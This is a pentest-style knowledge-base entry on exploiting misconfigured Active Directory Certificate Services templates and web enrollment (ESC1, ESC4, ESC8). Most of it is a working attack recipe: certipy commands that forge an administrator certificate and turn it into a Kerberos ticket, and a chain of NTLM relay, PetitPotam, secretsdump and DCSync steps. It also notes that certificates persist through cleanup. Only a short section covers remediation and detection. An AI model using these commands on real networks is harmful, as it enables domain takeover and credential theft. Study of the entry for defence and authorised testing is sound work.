---
id: "adcs-esc1-esc8"
title: "AD CS certificate abuse (ESC1 / ESC8 etc.)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "no single CVE (Certified Pre-Owned)"
severity: "critical"
cvss: 8.8
severity-basis: "editorial"
severity-note: "Legacy editorial severity retained; the stored CVSS score maps to high. No vendor classification or laboratory verification is implied."
product: "Active Directory Certificate Services"
versions: "any AD CS deployment (misconfiguration)"
ports: "80, 443, 135, 445"
keywords: "adcs, esc1, esc8, certipy, pki, certificate-template"
entry: "AD CS certificate enrollment and web enrollment services"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic / implementation / misconfiguration classes, no CVE; see references at the end)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- `certipy find -u user@domain -p pass -dc-ip DC` output contains `[!] Vulnerabilities`.
- `http://<CA>/certsrv/` is reachable (the relay target for ESC8).

## Prerequisites

- A domain account (ESC1 only needs the ability to request certificates); ESC8 requires being able to trigger machine account authentication (PrinterBug/PetitPotam).
- A template exists on the CA that allows "requester supplies subject" or "any purpose".

## PoC

```bash
# 1) Enumerate
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.10 -vulnerable -stdout

# 2) ESC1: request an administrator certificate using a template with a controllable subject
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

# 3) Exchange the certificate for a TGT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```

## Exploitation Steps

1. `certipy find` to find ESC1 (`EnrolleeSuppliesSubject`), ESC8 (`Web Enrollment` + NTLM), ESC3 (enrollment agent), ESC4 (template ACL writable).
2. ESC1: request a certificate with `-upn administrator@domain` → `certipy auth` for a TGT → `secretsdump -k`.
3. ESC8: `ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` + `PetitPotam.py CA$@DC`, relay the machine account to get a DC certificate → `certipy auth -pfx dc.pfx` → DCSync.
4. ESC4: when the template ACL is writable, first modify the template into the ESC1 shape, then exploit as in step 2.
5. Persistence note: certificates are usually valid for 1 year, and revocation lists (CRLs) are not necessarily checked — this is why it is more stable than tickets, and also what is most easily missed during cleanup.

## Remediation and Mitigation

- Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from templates; restrict who can enroll/write template ACLs; enable EPA on the CA and disable NTLM Web Enrollment.
- Detection: tools like `certipy` leave 4886/4887 events and anomalous `Request ID`s on the CA.

## References

- SpecterOps "Certified Pre-Owned"; certipy documentation.
